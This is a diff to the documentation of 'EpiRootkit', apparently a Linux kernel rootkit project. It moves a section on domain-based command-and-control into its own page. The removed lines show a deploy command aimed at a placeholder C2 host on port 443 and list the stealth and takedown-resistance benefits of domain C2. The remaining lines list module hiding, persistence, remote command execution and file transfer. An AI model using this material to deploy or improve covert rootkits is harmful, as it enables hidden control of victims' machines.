@@ -45,32 +45,11 @@ status Client-1
 # EpiRootkit Status: Version 1.0.0, Module Hidden: YES
 ```
 
-## DNS Resolution Feature
-
-**Real rootkit behavior with domain-based C2:**
-
-```bash
-# Deploy with domain instead of IP
-sudo ./deploy_rootkit.sh address=jules-c2.example.com port=443
-
-# Kernel messages show DNS resolution
-dmesg | tail -5
-# [2025-05-25 16:13:09] Resolving domain: jules-c2.example.com
-# [2025-05-25 16:13:09] Resolved to 203.0.113.42
-# [2025-05-25 16:13:09] Connected to C2 server
-```
-
-**Benefits:**
-- **Dynamic infrastructure**: Easy C2 server changes
-- **Load balancing**: DNS can rotate between servers  
-- **Stealth**: Less suspicious than hardcoded IPs
-- **Resilience**: Backup domains for takedown resistance
-
 ## Core Components
 
 ### Network Layer
 - **Connection Management**: Persistent TCP with auto-reconnect
-- **DNS Resolution**: Kernel-space resolver using 8.8.8.8
+- **DNS Resolution**: See [DNS Resolution](./features/dns-resolution.md) for details
 - **Keepalive System**: 60-second ping/pong monitoring
 - **Socket Handling**: Low-level network operations
 
@@ -153,6 +132,7 @@ persist Client-1 install  # Install all mechanisms
 
 - **[Deployment](./deployment.md)**: Build and load with domain support
 - **[Connection](./connection-authentication.md)**: Network communication
+- **[DNS Resolution](./features/dns-resolution.md)**: Domain name resolution
 - **[Commands](./features/command-execution.md)**: Remote command execution
 - **[File Transfer](./features/file-transfer.md)**: Upload/download files
 - **[Stealth](./features/hiding.md)**: Module and file hiding
